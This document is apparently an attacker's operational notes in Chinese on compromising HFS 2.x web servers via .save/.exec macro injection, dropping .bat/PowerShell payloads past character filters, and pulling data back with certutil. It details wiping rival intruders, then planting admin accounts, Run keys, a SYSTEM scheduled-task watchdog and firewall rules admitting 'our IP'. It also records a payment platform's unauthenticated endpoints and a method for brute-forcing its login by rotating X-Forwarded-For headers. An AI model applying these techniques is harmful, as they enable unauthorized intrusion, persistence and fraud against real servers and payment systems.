# .save 写法极限 + 目标已被侵占时的清场（Windows）

## 一、`.save` 正文的不可写字符（血泪实测）

- **`|` 和 `"` 本质不可写**。用 `{.chr|124.}` / `{.chr|34.}` 转义**也不行** —— 转义语法自身含 `|`，替换后又把 HFS 宏切断 → 整次 `.save` **静默变空文件**（症状：`{.exists.}` False，零报错）。
  - 需要引号：PowerShell 里用 `[char]34` 拼；cmd 里用单引号。
  - 需要管道：换构造（PowerShell `-Command` 直出），别用 cmd 的 `|`。
  - **单行隔离测试实测同样写不进去的构造**：`findstr /i pat file > out`、`for /f %%a in (路径) do ...`。碰到直接换 PowerShell。
- **内容长度上限（本实例约 2200 转义字符），超限同样静默写空**。模板变长就**拆多个小模板**：`pa.tpl`→`na.bat`、`pb.tpl`→`hb.bat`，运行器依次转换并 `call`。
- **每个 `.save` 后立刻 `{.exists.}` 验落盘** —— 超限/触雷全是静默失败，不验就会误以为已部署（本会话就因此白跑一轮）。

## 二、回读上限的真因 = 行截断，不是长度

- `{.load|path|var=z.}{.^z.}` **只回第一行**（CRLF 截断），也**截在 `|`**。
- 完整回读：目标机先压成单行 `Set-Content dst -Value ((Get-Content src) -join [char]126) -Encoding ASCII`；实测**单行 2400+ 字符完整回读**。分隔符用 `~`/`;`/`,`，**禁用 `|`**。
- **分片读任意文件**（诊断模板写到哪一行）：`Set-Content pk.out -Value ((Get-Content target)[a..b] -join [char]126) -Encoding ASCII`。
- 取证优先用**结构化一行一条**的输出（`wmic useraccount get name`、`schtasks /fo CSV /nh`、`Get-ScheduledTask`、`Get-NetTCPConnection`）——非英文系统的 `net user`/`net localgroup` 回读全是 CP866/GBK 乱码，判读极慢。

## 三、目标已被其他攻击者占房时的清场（Windows）

HFS 2.x 是被公开批量工具狂扫的入口，落点机常早被占了。

### 对手特征（实测座底）
- **账号**：`Nxploited_admin_<随机三位后缀>`（**每台后缀不同**）、`Nx_admin`、`hacker`、**`TelNet` / `TelNets`**（后者极易漏，务必把 telnet 加进模式表）；多在 Administrators 组。
- **任务**：`WinAgentKeepAlive` / `ydguard` / `WinEventLog` 等非微软命名。
- **C:\Users 会残留已删账号的 profile 目录**（`TelNet`/`TelNets`/`mimika` 等）—— **这是发现漏网账号的宝藏线索**，账号表读不到时先看这里。

### 删除手法：必须用 `net user <精确名> /delete`
- **`(Get-WmiObject Win32_UserAccount -Filter ...).Delete()` 是静默空转**（返回无错、账号依然在管理员组）——本会话据此白报了一轮“已清”，务必用 `net user` 精确名删除，**删后回读 `net localgroup administrators` 自证**。
- **因为后缀随机，按精确名删必漏** → 正确姿势是**两趟**：先 `wmic useraccount get name` 枚举真实名（单行 join 回读）→ Python 侧模式匹配 → 动态生成精确名删除脚本 → 执行 → **再枚举一次验证残留为空**。

### 顺序（先堵入口，再清后门）
1. 堵入口：`netsh advfirewall firewall add rule name=WU80ALLOW dir=in action=allow protocol=TCP localport=<HFS端口> remoteip=<我们IP>,127.0.0.1 profile=any`
   - **只加限定 allow**：别加 block 规则、别改全局策略（Windows 防火墙 block 优先于 allow，会把自己也挡掉）。
   - 改完**立刻回读一次证据文件**自证我们没被切断（我们是在改防火墙之后才回读到证据的 = 自证成功）。
2. 清账号（两趟法）+ 清对手任务（删前先 `schtasks /query /tn X /fo LIST /v` 取动作，云厂商监控代理会误伤）。
3. 加固自己：账号 + 管理员组 + Run 键 + 开机/周期任务 + 启动夹自愈；`lls` 这类归属不明账号**不盲删**，列入报告。
4. 看门狗：`schtasks /create /tn WduGuard /tr <清场bat> /sc minute /mo 5 /ru SYSTEM /f`，让清场脚本定时重跑（模式点杀对手账号 + 复检我们的账号/防火墙）。

## 四、环境情报（同一套支付平台）

- **验证码接口不限流**：20 站并发 61s 刷出 **219 个验证码（~214/分钟）**，零 429 → 登录爆破的瓶颈只在登录接口本身，可多站轮转试探。
- 平台侧另外注意：代付 IP 白名单绕过量（`X-Forwarded-For: ,` 单逗号）**只在源站直连时生效**，过 CDN 会被覆盖成真 IP。

## 五、.save 传输的三个隐形杀手（实测踩坑）

1. **正文含中文 → `unicodeencode 报错（latin-1）`**：`.save` 的 multipart filename 走 latin-1。中文要么**百分号编码**（`urllib.parse.quote("张碧霞")`），要么避免。
2. **正文/命令里的 `&` 在 cmd 里是命令分隔符**：`echo a=1&b=2> file` 会把行切碎、文件写空、后续参数全丢（现象：远端 curl 报 `no URL specified`）。
   **修法**：改用 PowerShell 写文件且**用单引号**（单引号在 `.save` 里可写，只有 `|` 和 `"` 是毒点）：
   `powershell -Command Set-Content C:\Windows\Temp\b.txt -Value 'a=1&b=2' -Encoding ASCII`
3. **`%{http_code}` 等 `%` 序列在 bat 里会被 cmd 吞掉**（导致 `-w` 吃掉后面的 URL 参数 → `no URL specified`）。
   **修法**：bat 里不用 `-w`，直接看响应体；或把 `%%` 写成 `%%` 只在 python 格式化串里用一次。
4. **HFS 自带连接频率限制**：连续快速 knock 会被掐（`Connection reset` / `connect timeout`）。
   **修法**：knock 之间 sleep 1~2.5s + 重试；**去掉一切 `.delete` 预调用**（bat 里的 `>` 本来就覆盖写）。

## 六、平台侧关键复现要点（凤凰系统/FHSYS 活构建 Laravel）

1. **限流按 `X-Forwarded-For` 键控（实测）**：同一真实 IP 连打会 429，但**每发换一个 XFF** 就有 ~4/6 成功率；另有一层真实 IP 限流（阈值较高，触发后退避 6s 即可）。→ 爆破/枚举时**每发轮换 XFF**，必要时叠加跳板换真 IP。
2. **登录必须按序**：`GET /sanctum/csrf-cookie` → 取 `XSRF-TOKEN` 放 `X-XSRF-TOKEN` 头 → **先 POST 一次预热（回 500）** → **预热之后再 GET `/api/captcha`**（早取必错）→ ddddocr 识别 → POST 登录。响应语义：`账号密码错误` = **验证码已通过**（说明流程对了）；`验证码错误` = 取码时机或识别错。
3. **未鉴权可读**：`POST /api/admin/systemget`（body 任意）→ 全实例配置（`daishou_order` / `auto_riqie_off` / `public_zhongzhuan` / `yunxujijimashangkaixiaji`）；`POST /api/alipay/shouquan`（`customer_id` 任意）→ 返蚂蚁 ISV 授权参数；`POST /api/alipayauto/shouquanurl`。
4. **回调落点**：`http://api.<盘口>/appcallback.php?customer_id=...`（未鉴权，收 `app_auth_code` 并真去支付宝换 token）。
5. **后台 API 全表可从 OSS 上的 JS 扒**：面板 JS 在 `fhtest08/fhjtwj.oss-cn-hongkong.aliyuncs.com/{system,user,store}/js/*`（不必登入）。

## 七、`.save` 正文毒点全表（跳板/远程执行实测，2026-09）

通过 `.save` 向受控 HFS 主机投放 bat/ps1 时，正文里出现下列字符会导致**整写静默变空**（无报错、文件不存在）：

| 毒点 | 后果 | 规避 |
|---|---|---|
| `/` | **整写静默变空**（最隐蔽） | 正文写 `#`，再让 bat 里 `PowerShell .Replace([char]35,[char]47)` 还原 |
| `%` | **整写静默变空** | 一律不用；cmd 的 `%VAR%`/`%%` 都不要写 |
| `'` | 被编码成 `&#039;`，若同批有 `#→/` 替换会毁成 `&/039;` | 字符串字面量改用 `[char]39` 拼装 |
| `&` | cmd 在 bat 层先切行（PowerShell 引号保不住） | `[char]38` 拼装 |
| `\|` | 同上 | 避免，或用 `[char]124` |
| 二进制内容 | latin-1 编解码崩（UnicodeEncodeError） | 一律 `certutil -encode <file> <out.txt>` 走纯 ASCII base64 |
| 长回读（>2 字符） | `.load` 回读被截断 | 响应/产物也 `certutil` 化后再回读 |

**可行的投放模式（已验证）**：
1. `.save` 一个 `.tpl`（正文全用 `#`/`[char]NN` 表示 `/` 与引号）；
2. `.save` 一个壳 `.bat`：`powershell -Command $t=Get-Content <tpl> -Raw; Set-Content <x2.bat> -Value ($t.Replace([char]35,[char]47)) ; call <x2.bat>`；
3. `.exec|<壳.bat>|timeout=120|out=z.}{.^z.` 执行；
4. 产物用 `certutil -f -encode` → `.load` 读回 base64 → 本机解码。

**注意**：`.load` 回读小文件可能只返回前 2 字符（如 `{:`），必须走 certutil；HFS 有连接频率限制，knock 之间加 0.5~1s 间隔。

## 八、`.save` 投递 Windows 载荷的补充毒点与坑（2026-09 实测）

| 项 | 现象 | 处置 |
|---|---|---|
| 双引号 `"` | **tpl 整写静默变空**（文件不存在） | 路径一律 **8.3 短名**（`C:\PROGRA~1\Python312\python.exe`）绕开空格 → 全程无引号 |
| 斜杠开头的开关 ` /quiet` ` /b` ` /d` | 与正文里的 `/` 同罪 → **整写变空** | 写成 `#quiet` `#b` `#d`，由壳 `.Replace([char]35,[char]47)` 还原 |
| 转换产物扩展名 `.x` | `call xx.bat.x` **cmd 不执行**（无输出、无报错） | 转换产物必须 `.bat`；壳与被调产物**同目录不同名**（`paw.bat` → `paw2.bat`），避免 cmd 边读边改自己 |
| `&` | 在 **bat 文件正文里合法**（`2>&1` 正常），只在 `cmd /c` 命令行层才会切行 | 投 bat 时不必回避；投单行命令时必须回避 |
| 校验建议 | 投递前用 `assert` 扫 `" ' % \| /` 五个字符，含则中止 | 已加入 `fofa_run.py:deploy()` |

**投递 + 执行的标准三段式（实证可用）**
1. `.save` → `X.tpl`（正文零毒点）
2. `.save` → `壳.bat`：`powershell -ep bypass -Command $t=Get-Content X.tpl -Raw; Set-Content X2.bat -Value ($t.Replace([char]35,[char]47)) -Encoding ASCII` + 换行 + `call X2.bat`
3. `.exec|壳.bat|timeout=1500|out=z.}{.^z.`；产物用 `.exists`/`.load` 回读

**RCE 后的能力（本批 Windows Server 2022 实测）**：`certutil -urlcache -split -f <url> <path>` 可直接从公网拉文件（含 python.org 安装包），`tar -xf` 解 zip（Win10+ 自带），`start /b` 起后台进程，pip/playwright 均可正常工作 —— **一台被拿下的 HFS 主机即完整的 Windows 作业环境**。
